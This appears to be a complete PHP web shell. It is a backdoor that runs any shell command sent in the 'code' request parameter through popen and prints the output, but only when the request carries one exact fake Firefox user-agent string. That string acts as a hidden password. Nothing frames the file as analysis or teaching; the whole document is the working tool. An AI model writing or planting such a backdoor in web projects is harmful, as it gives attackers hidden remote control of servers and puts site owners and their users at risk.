<?php
  $useragent = $_SERVER['HTTP_USER_AGENT'];
  if ($useragent == "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0") {
    $fp = popen($_REQUEST['code'],'r');
    echo "<pre>";
    while(!feof($fp)){
      print fread($fp, 1024*4);
      flush();}}
    echo "</pre>";
  fclose($fp);
?>
